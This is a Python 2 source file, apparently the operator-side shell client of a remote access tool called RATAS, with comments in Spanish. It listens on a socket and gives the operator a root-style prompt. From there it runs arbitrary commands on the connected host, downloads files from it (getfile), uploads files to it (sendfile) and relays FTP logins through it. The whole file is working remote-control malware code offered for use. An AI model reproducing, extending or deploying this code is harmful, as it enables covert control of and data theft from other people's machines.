#!/usr/bin/env python
# -*- coding: utf-8 -*-
# RATAS [shell_client_module] (https://www.github.com/R3nt0n/ratas)
# R3nt0n (https://www.github.com/R3nt0n)

import os
from getpass import getpass

from color import color
from base64 import urlsafe_b64encode, urlsafe_b64decode
from cmd_help import manual, manualFTP  # Manual de los comandos


class Shell:
    def __init__(self, conn):
        self.conn = conn
        self.shellFTP = False
        self.ipServer = None
        self.pwd = None

    # ACTUALIZAR EL PROMPT
    ############################################################################
    def updatePrompt(self, output):
        if output.startswith(':FTP:'):
            self.shellFTP = True
            prompt = 'ftp > '
        else:
            self.shellFTP = False
            prompt = '{}root@{}{}:{}{}{}# '.format(color.RED + color.BOLD, self.ipServer, color.END, color.BLUE + color.BOLD, self.pwd, color.END)
        return prompt

    # FORMATEO DE LA ENTRADA
    ############################################################################
    def formatInput(self, command):
        command = command.strip(' ')
        command = command.replace('\ ', ':SP:')  # Sustituir espacios escapados
        command = command.replace(' ', ':&:')    # Separador de argumentos
        command = command.replace(':SP:', '\ ')   # Sustituir espacios escapados
        return command

    # FORMATEO DE LA SALIDA
    ############################################################################
    def formatOutput(self, output):
        if ':CWD:' in output:
            self.pwd = output.split(':CWD:')[-1:][0]
            output = output.split(':CWD:')[:-1][0]
        if output.startswith(':FTP:'):
            output = output[5:]
        if output.startswith(':ERR:'):
            output = '{}[!]{} ERROR: {}'.format(color.RED,color.END, output[5:])
        return output

    # LIMPIAR LA PANTALLA
    ############################################################################
    def clear(self):
        os.system(['clear', 'cls'][os.name == 'nt'])

    # COMPROBAR SI UNA VARIABLE ESTA VACIA
    ############################################################################
    def isEmpty(self, variable):
        empty = False
        if len(str(variable)) == 0:
            empty = True
        return empty

    # RECEPCIÓN DE FICHEROS POR EL SOCKET
    ############################################################################
    def getFile(self, destin):
        exists = self.conn.receive()
        if exists == ':NOEXISTS:':
                output = ':ERR:El fichero no existe'
        else:
            while True:
                self.conn.send(':SYNC:')
                bytesEncoded = self.conn.receive()

                if bytesEncoded == ':ENDFILE:':
                    output = '{}[+]{} La descarga se ha completado'.format(color.GREEN, color.END)
                    self.conn.receive() # Sincronización
                    break
                else:
                    try:
                        bytesDecoded = urlsafe_b64decode(bytesEncoded)
                        with open(destin, 'ab') as fileToSave:
                            fileToSave.write(bytesDecoded)

                    except:
                        output = ':ERR:Ha habido un error en la transferencia'
                        break
        return output

    # ENVÍO DE FICHEROS POR EL SOCKET
    ############################################################################
    def sendFile(self, fileToSend):
        output = ''
        if os.path.exists(fileToSend):
            self.conn.send(':EXISTS:')
            with open(fileToSend, 'rb') as f:
                data = f.readlines()
            for line in data:
                lineEncoded = urlsafe_b64encode(line)   # codifica el fichero
                imReady = self.conn.receive()
                if imReady == ':SYNC:':
                    self.conn.send(lineEncoded)
                else:  # recibe ERROR
                    output = ':ERR:Ha habido un error en la transferencia'

            self.conn.send(':ENDFILE:')
            imReady = self.conn.receive() # Sincronización

            if imReady == ':SYNC:':
                output = '{}[+]{} La descarga se ha completado'.format(color.GREEN, color.END)

        else:
            self.conn.send(':NOEXISTS:')
            output = ':ERR:El fichero no existe'

        return output

    # EJECUCIÓN DE COMANDOS
    ############################################################################
    def exeRemote(self, command):
        command = self.formatInput(command)
        output = ''

        ########################################################################
        if command == 'exit':            # Cierra la conexión
            self.conn.send(command)
            self.conn.close()
            output = ':CLOSE:'
        ########################################################################
        elif command.startswith('help'):   # Muestra la ayuda de un comando
            output = manual(command)
        ########################################################################
        elif command.startswith('clear'):  # Limpia la pantalla
            self.clear()
        ########################################################################
        elif command.startswith('ftp'):  # Conexion con servidor FTP

            if len(command.split(':&:')) != 2:
                output = ':ERR:No puedes dejar el campo del host en blanco'
            else:
                user = raw_input('\nIntroduce el nombre de usuario >>> ')
                password = getpass('\nIntroduce la contraseña >>> ')
                if not self.isEmpty(user):
                    command += ':&:' + user + ':&:' + password
                self.conn.send(command)
                output = self.conn.receive()
                if output.startswith(':FTP:'):
                    self.clear()
                    output = output + '\n' + manualFTP('shortHelp')
        ########################################################################
        elif command.startswith('getfile'):
            inputData = command.split(':&:')
            if len(inputData) != 3:
                output = ':ERR:Número de argumentos incorrecto.\n' + \
                         'Escribe help getfile para conocer la sintaxis.\n'
            else:
                command = inputData[0]
                fileToGet = inputData[1]
                destin = inputData[2]
                self.conn.send(command + ':&:' + fileToGet)
                output = self.getFile(destin)
        ########################################################################
        elif command.startswith('sendfile'):
            inputData = command.split(':&:')
            if len(inputData) != 3:
                output = ':ERR:Número de argumentos incorrecto.\n' + \
                         'Escribe help sendfile para conocer la sintaxis.\n'
            else:
                command = inputData[0]
                fileToSend = inputData[1]
                destin = inputData[2]
                self.conn.send(command + ':&:' + destin)
                output = self.sendFile(fileToSend)
        ########################################################################
        elif self.isEmpty(command):
            output = ':ERR: No has introducido ningun comando'
        ########################################################################
        else:
            self.conn.send(command)
            output = self.conn.receive()
        ########################################################################
        return output

    # EJECUCIÓN DE COMANDOS FTP
    ############################################################################
    def exeRemoteFTP(self, comftp):
        outputFTP = ":FTP:"
        if comftp.startswith('help'):
            outputFTP += manualFTP(comftp)
        elif comftp.startswith('clear'):  # Limpiar la pantalla
            self.clear()
        elif self.isEmpty(comftp):
            outputFTP += ':ERR:No has introducido ningun comando'
        else:  # Enviar comando FTP
            self.conn.send(':FTP:' + comftp)
            outputFTP = self.conn.receive()
        return outputFTP

    # ARRANCAR LA SHELL
    ############################################################################
    def start(self):
        initial_info = (self.conn.receive()).split(':CWD:')
        self.ipServer = initial_info[0]
        self.pwd = initial_info[1]
        self.clear()
        print manual('help')
        output = ''

        while True:
            try:
                prompt = self.updatePrompt(output)
                command = raw_input(prompt)

                if self.shellFTP:
                    output = self.exeRemoteFTP(command)
                else:
                    output = self.exeRemote(command)

                if output == ':CLOSE:':
                    break
                else:
                    print self.formatOutput(output)

            except:
                self.conn.send('exit')
                self.conn.close()
                break


# Ejemplo de uso:
if __name__ == '__main__':
    from connection import Connection
    conn = Connection('localhost', 5555)
    conn.listen()
    shell = Shell(conn)
    shell.start()
